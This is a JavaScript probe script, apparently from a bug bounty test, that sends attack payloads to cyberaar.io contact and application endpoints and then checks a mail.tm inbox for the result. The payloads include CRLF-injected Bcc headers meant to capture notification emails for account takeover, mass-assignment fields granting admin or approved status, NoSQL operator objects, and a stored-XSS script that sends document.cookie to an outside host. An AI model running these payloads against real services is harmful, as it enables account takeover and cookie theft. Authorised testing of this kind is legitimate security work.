// CYBERAAR : injection CRLF dans les champs de formulaire -> capture des e-mails de notification
// (l objectif : un Bcc injecte dans l email que le vendor envoie = on recoit une copie,
//  y compris un eventuel lien de confirmation de compte -> ATO).
// Regles : tests dans le perimetre, preuves non destructives, pas de DoS, pas de donnees reelles.
import fs from "fs";
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
const INBOX = "bbtest4926@maxxspace.com";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function post(url, body, h = {}) {
  const t0 = Date.now();
  try {
    const r = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json", Accept: "application/json", "User-Agent": UA, Origin: new URL(url).origin, Referer: new URL(url).origin + "/", ...h }, body: JSON.stringify(body), redirect: "manual", signal: AbortSignal.timeout(25000) });
    return { s: r.status, ms: Date.now() - t0, txt: await r.text(), cookies: r.headers.getSetCookie?.() || [] };
  } catch (e) { return { s: 0, ms: Date.now() - t0, txt: "ERR " + (e.cause?.code || e.message) }; }
}
const show = (l, r) => console.log("  " + l.padEnd(52) + "HTTP " + r.s + " " + String(r.ms).padStart(5) + "ms  " + r.txt.replace(/\s+/g, " ").slice(0, 150));

// 1) champ de controle, 2) injection CRLF
const CRLF = "Test CyberAar\r\nBcc: " + INBOX;
const CASES = [
  ["contact : nominal (controle)", { name: "Test CyberAar", email: INBOX, subject: "Test programme", message: "Test de la surface CyberAar - rapport de bug bounty. Message de controle." }],
  ["contact : CRLF dans name", { name: CRLF, email: INBOX, subject: "Test programme", message: "Test CRLF name CyberAar - rapport de bug bounty." }],
  ["contact : CRLF dans subject", { name: "Test CyberAar", email: INBOX, subject: CRLF, message: "Test CRLF subject CyberAar - rapport de bug bounty." }],
  ["contact : CRLF dans email", { name: "Test CyberAar", email: INBOX + "\r\nBcc: " + INBOX, subject: "Test programme", message: "Test CRLF email CyberAar - rapport de bug bounty." }],
  ["contact : mass assignment", { name: "Test CyberAar", email: INBOX, subject: "Test programme", message: "Test mass assignment CyberAar.", role: "admin", isApproved: true, status: "approved", internal: true }],
  ["contact : name en tableau (type confusion)", { name: ["Test", "Admin"], email: INBOX, subject: "Test programme", message: "Test type confusion CyberAar." }],
  ["contact : name en objet (NoSQL)", { name: { "$ne": null }, email: INBOX, subject: "Test programme", message: "Test NoSQL CyberAar." }],
  ["contact : XSS stocke", { name: "<script>fetch('https://bb-test.enseignementsecondaire.bj/x?'+document.cookie)</script>", email: INBOX, subject: "<img src=x onerror=alert(1)>", message: "<b>Test XSS</b> CyberAar - rapport de bug bounty." }],
  ["contact : longueur excessive", { name: "A".repeat(5000), email: INBOX, subject: "B".repeat(5000), message: "C".repeat(20000) }],
];
console.log("=== A) cyberaar.io/api/contact (actif Standard) ===");
for (const [l, b] of CASES) { const r = await post("https://cyberaar.io/api/contact", b); show(l, r); await sleep(2500); }

console.log("\n=== B) cyberaar.io/api/apply (proposition d'organisation) ===");
for (const [l, b] of [
  ["apply : nominal", { org: "BB Probe Org", sector: "tech", email: INBOX, message: "Test de la surface CyberAar - rapport de bug bounty." }],
  ["apply : CRLF dans org", { org: CRLF, sector: "tech", email: INBOX, message: "Test CRLF org CyberAar - rapport de bug bounty." }],
  ["apply : CRLF dans message", { org: "BB Probe Org", sector: "tech", email: INBOX, message: "Test\r\nBcc: " + INBOX + "\r\n\r\nCyberAar test injection" }],
  ["apply : mass assignment", { org: "BB Probe Org", sector: "tech", email: INBOX, message: "Test mass assignment CyberAar.", status: "APPROVED", assets: [{ url: "aarme.cyberaar.io", class: "Critique" }] }],
]) { const r = await post("https://cyberaar.io/api/apply", b); show(l, r); await sleep(2500); }

console.log("\n=== C) ma boite mail : un email recu ? (la preuve) ===");
const TOK = fs.readFileSync("/tmp/opencode/mail_token.txt", "utf8").trim();
try {
  const r = await fetch("https://api.mail.tm/messages", { headers: { Authorization: "Bearer " + TOK } });
  const j = await r.json();
  const msgs = Array.isArray(j) ? j : (j["hydra:member"] || []);
  console.log("  " + msgs.length + " message(s) dans la boite :");
  for (const m of msgs.slice(0, 8)) console.log("    - " + (m.from?.address || "?") + " | " + (m.subject || "").slice(0, 80) + " | " + (m.createdAt || ""));
} catch (e) { console.log("  (boite inaccessible: " + e.message.slice(0, 60) + ")"); }
